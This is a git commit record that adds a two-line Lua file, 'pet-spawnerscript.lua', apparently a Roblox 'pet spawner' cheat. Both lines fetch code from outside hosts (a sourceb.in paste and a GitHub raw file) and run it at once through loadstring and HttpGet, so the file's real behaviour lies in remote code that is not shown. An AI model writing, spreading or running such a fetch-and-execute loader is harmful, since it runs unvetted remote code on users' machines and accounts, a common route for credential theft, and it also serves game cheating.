93ff0bff241d15372307ecdb2d1fe390d9d27563
Breaad <ayoliam11@gmail.com>
2026-03-15 17:45:46 +0800

    Create pet-spawnerscript.lua

---
+++ pet-spawnerscript.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/Qimt4s9YSX/0"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeOPScriptz/EAZY-HUB/refs/heads/main/pet-spawner.luascript"))()
